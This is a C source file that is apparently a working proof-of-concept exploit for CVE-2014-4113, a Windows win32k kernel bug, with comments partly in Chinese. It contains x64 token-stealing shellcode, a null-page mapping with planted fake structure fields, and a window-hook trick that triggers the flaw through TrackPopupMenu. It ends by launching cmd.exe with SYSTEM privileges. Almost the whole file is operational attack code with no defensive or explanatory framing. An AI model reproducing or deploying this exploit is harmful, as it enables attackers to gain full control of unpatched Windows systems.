#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>

DWORD64 __stdcall GetPTI()
{
	DWORD64* teb = (DWORD64*)__readgsqword(0x30);     
	DWORD64 pti = (DWORD64)*(DWORD64*)((byte*)teb + 0x78); //获取 pti(Win32ThreadInfo)
	return pti;
}

typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);


//shellcode x64
CHAR ShellCode[] =
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"			// mov rdx, [gs:188h];		get _ETHREAD pointer from KPCR
"\x4C\x8B\x42\x70"								// mov r8, [rdx + 70h];		_EPROCESS(see PsGetCurrentProcess function)
"\x4D\x8B\x88\x88\x01\x00\x00"					// mov r9, [r8 + 188h];		ActiveProcessLinks list head
"\x49\x8B\x09"									// mov rcx, [r9];			follow link to first process in list
												//find_system_proc:
	"\x48\x8B\x51\xF8"							// mov rdx, [rcx - 8];		offset from ActiveProcessLinks to UniqueProcessId
	"\x48\x83\xFA\x04"							// cmp rdx, 4;				process with ID 4 is System process
	"\x74\x05"									// jz found_system;			found SYSTEM token
	"\x48\x8B\x09"								// mov rcx, [rcx];			follow _LIST_ENTRY Flink pointer
	"\xEB\xF1"									// jmp find_system_proc;	loop
												//get_system_token:
	"\x48\x8B\x81\x80\x00\x00\x00"				// mov rax, [rcx + 80h];	offset from ActiveProcessLinks to Token
	"\x24\xF0"									// and al, 0f0h;			clear low 4 bits of _EX_FAST_REF structure
												//copy_token:
	"\x49\x89\x80\x08\x02\x00\x00"				// mov[r8 + 208h], rax;		copy SYSTEM token to current process's token
												//return:
	"\xc3"										// ret
	;

LRESULT CALLBACK WinSunProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == WM_ENTERIDLE)
	{
		/*自动创建第二个窗口并发送消息*/
// 		PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, 0);
// 		PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, 0);
// 		PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK NewMenuProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == 0x1eb)
	{
		EndMenu();
		return 0x00000000fffffffb;  //触发漏洞
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT *ptag = (CWPSTRUCT*)lParam;
	if (ptag->message == 0x1eb)
	{
		if (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback))
		{
			SetWindowLongPtr(ptag->hwnd, GWLP_WNDPROC, (LONG_PTR)NewMenuProc);  //修改菜单窗口过程函数
		}
	}

	return CallNextHookEx(0, code, wParam, lParam);
}

HWND CreateMainWindow()
{
	HINSTANCE hInstance = ::GetModuleHandle(NULL);

	WNDCLASS wndcls = { 0 };
	wndcls.hInstance = hInstance;
	wndcls.lpfnWndProc = WinSunProc;
	wndcls.lpszClassName = "CVE-2014-4113";

	RegisterClass(&wndcls);

	HWND hwnd = CreateWindowA(wndcls.lpszClassName, "CVE-2014-4113", WS_OVERLAPPEDWINDOW, 0, 0, 800, 800, NULL, NULL, wndcls.hInstance, NULL);
	return hwnd;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		FreeLibrary(hNtdll);
	}

	LPVOID baseAddress = (PVOID64)(0x00000000fffffffb);     
	ULONG regionSize = 0x1000;

	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(),
		&baseAddress,
		0,
		&regionSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);

	if (ntStatus != 0) {
		FreeLibrary(hNtdll);
		return 1;
	}

	*(DWORD64*)0x10000000B = GetPTI();
	*(LPBYTE)0x100000025 = 0x4;
	*(DWORD64*)0x10000008B = (DWORD64)baseAddress;

	memcpy_s(baseAddress, 100, ShellCode, sizeof(ShellCode));

	HWND hwnd = CreateMainWindow();

	HMENU popup_menu1 = CreatePopupMenu();
	HMENU popup_menu2 = CreatePopupMenu();		//这里还需要一个 PopupMenu
	AppendMenu(popup_menu2, MF_STRING, 0, "pop cmd");	//给PopupMenu随便添加个菜单项 （不能没有菜单项）
	AppendMenu(popup_menu1, MF_STRING | MF_POPUP, (UINT_PTR)popup_menu2, "EXPLOIT");  //给它一个 spwndNextPopup 指针

	SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId());

	BOOL ret = TrackPopupMenu(popup_menu1, TPM_RIGHTBUTTON, 0, 0, 0, hwnd, 0);

	system("cmd.exe");


	return 0;
}

